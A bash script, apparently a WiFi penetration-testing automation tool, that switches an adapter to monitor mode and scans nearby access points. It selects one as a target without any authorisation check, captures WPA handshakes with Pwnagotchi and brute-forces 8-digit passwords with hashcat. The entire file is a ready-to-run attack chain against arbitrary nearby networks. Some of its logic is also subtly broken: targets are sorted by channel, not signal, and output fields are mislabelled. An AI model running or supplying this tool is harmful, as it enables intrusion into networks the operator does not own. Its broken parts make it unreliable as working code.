#!/bin/bash

# ----- GLOBAL SETTINGS -----
LOG_FILE="/var/log/wifi_pentest.log"
TMP_DIR="/tmp/wifi_pentest"
HANDSHAKE_DIR="$TMP_DIR/handshakes"
PWNAGOTCHI_DIR="/opt/pwnagotchi"

# ----- LOGGING -----
exec &> >(tee -a "$LOG_FILE")

# ----- DEPENDENCIES -----
REQUIRED=("bettercap" "iw" "ip" "whiptail" "airodump-ng" "hcxdumptool" "hashcat" "python3")
MISSING=()

# ----- FUNCTIONS -----

# Check if running as root
function check_root() {
  if [[ $EUID -ne 0 ]]; then
    echo "[ERROR] This script must be run as root."
    exit 1
  fi
}

# Check and install dependencies
function check_dependencies() {
  echo "[INFO] Checking dependencies..."
  for dep in "${REQUIRED[@]}"; do
    if ! command -v "$dep" &> /dev/null; then
      MISSING+=("$dep")
    fi
  done

  if [ ${#MISSING[@]} -ne 0 ]; then
    echo "[ERROR] Missing dependencies: ${MISSING[*]}"
    echo "[INFO] Attempting to install missing dependencies..."
    apt-get update && apt-get install -y "${MISSING[@]}" || {
      echo "[ERROR] Failed to install some dependencies. Install them manually and rerun the script."
      exit 1
    }
  fi
  echo "[INFO] All dependencies are installed."
}

# Prepare environment
function setup_environment() {
  mkdir -p "$TMP_DIR" "$HANDSHAKE_DIR"
  echo "[INFO] Temporary directories prepared: $TMP_DIR"
}

# Detect wireless interface
function detect_interface() {
  local interface=$(iw dev | awk '$1=="Interface"{print $2}' | head -n 1)
  if [ -z "$interface" ]; then
    echo "[ERROR] No wireless interface detected. Ensure your adapter supports monitor mode."
    exit 1
  fi
  echo "$interface"
}

# Switch to monitor mode
function switch_to_monitor_mode() {
  local interface=$1
  echo "[INFO] Switching $interface to monitor mode..."
  ip link set "$interface" down
  iw dev "$interface" set type monitor
  ip link set "$interface" up
  if iwconfig "$interface" | grep -iq "Mode:Monitor"; then
    echo "[INFO] Monitor mode enabled on $interface."
  else
    echo "[ERROR] Failed to enable monitor mode on $interface."
    exit 1
  fi
}

# Restore interface to managed mode
function restore_interface() {
  local interface=$1
  echo "[INFO] Restoring $interface to managed mode..."
  ip link set "$interface" down
  iw dev "$interface" set type managed
  ip link set "$interface" up
  if iwconfig "$interface" | grep -iq "Mode:Managed"; then
    echo "[INFO] $interface restored to managed mode."
  else
    echo "[ERROR] Failed to restore $interface to managed mode. Check manually."
  fi
}

# Scan for targets
function scan_targets() {
  local interface=$1
  echo "[INFO] Scanning for targets with airodump-ng..."
  airodump-ng --write "$TMP_DIR/scan" --output-format csv "$interface" &
  local scan_pid=$!
  sleep 10
  kill "$scan_pid"

  echo "[INFO] Parsing discovered APs..."
  local ap_list=$(awk -F',' '/[0-9A-F]{2}(:[0-9A-F]{2}){5}/ && $4 != "" {print $1, $4, $6, $7}' "$TMP_DIR/scan-01.csv" | sort -k2 -nr | head -n 5)
  if [ -z "$ap_list" ]; then
    echo "[ERROR] No viable targets found. Try again in a different environment."
    restore_interface "$interface"
    exit 1
  fi
  echo "$ap_list"
}

# Select target from parsed APs
function select_target() {
  local ap_list="$1"
  echo "[INFO] Discovered Access Points:"
  echo "$ap_list" | awk '{printf "BSSID: %s, Channel: %s, ESSID: %s\n", $1, $2, $3}'
  local target_bssid=$(echo "$ap_list" | awk 'NR==1{print $1}')
  local target_channel=$(echo "$ap_list" | awk 'NR==1{print $2}')
  echo "$target_bssid $target_channel"
}

# Run Pwnagotchi
function run_pwnagotchi() {
  echo "[INFO] Starting Pwnagotchi for automated handshake capture..."
  if [ ! -d "$PWNAGOTCHI_DIR" ]; then
    echo "[ERROR] Pwnagotchi not found. Installing it now..."
    git clone https://github.com/evilsocket/pwnagotchi.git "$PWNAGOTCHI_DIR"
    pip3 install -r "$PWNAGOTCHI_DIR/requirements.txt"
  fi

  python3 "$PWNAGOTCHI_DIR/pwnagotchi.py" &
  local pwn_pid=$!
  sleep 20
  kill "$pwn_pid"
  echo "[INFO] Pwnagotchi run complete. Check $HANDSHAKE_DIR for captured files."
}

# Convert handshake file for cracking
function convert_handshake() {
  local handshake_file=$1
  echo "[INFO] Converting handshake file for Hashcat..."
  hcxpcapngtool -o "$TMP_DIR/handshake.hc22000" "$handshake_file"
}

# Crack handshake with Hashcat
function crack_handshake() {
  local handshake_file=$1
  if whiptail --yesno "Start real-time cracking with Hashcat?" 10 60 --title "Hashcat Confirmation"; then
    echo "[INFO] Starting Hashcat..."
    hashcat -m 22000 -a 3 "$handshake_file" ?d?d?d?d?d?d?d?d --force --status
  else
    echo "[INFO] Skipping cracking. File saved for manual cracking: $handshake_file"
  fi
}

# ----- MAIN -----
check_root
check_dependencies
setup_environment

INTERFACE=$(detect_interface)
echo "[INFO] Detected Wireless Interface: $INTERFACE"

switch_to_monitor_mode "$INTERFACE"

AP_LIST=$(scan_targets "$INTERFACE")
TARGET=$(select_target "$AP_LIST")
TARGET_BSSID=$(echo "$TARGET" | awk '{print $1}')
TARGET_CHANNEL=$(echo "$TARGET" | awk '{print $2}')

echo "[INFO] Targeting BSSID=$TARGET_BSSID on Channel=$TARGET_CHANNEL"
iwconfig "$INTERFACE" channel "$TARGET_CHANNEL"

run_pwnagotchi

HANDSHAKE_FILE=$(ls $HANDSHAKE_DIR/*.pcap 2>/dev/null | head -n 1)
if [ -f "$HANDSHAKE_FILE" ]; then
  convert_handshake "$HANDSHAKE_FILE"
  crack_handshake "$TMP_DIR/handshake.hc22000"
else
  echo "[ERROR] No handshake files found. Check $HANDSHAKE_DIR."
fi

restore_interface "$INTERFACE"
echo "[INFO] Script execution complete. Logs saved to $LOG_FILE."
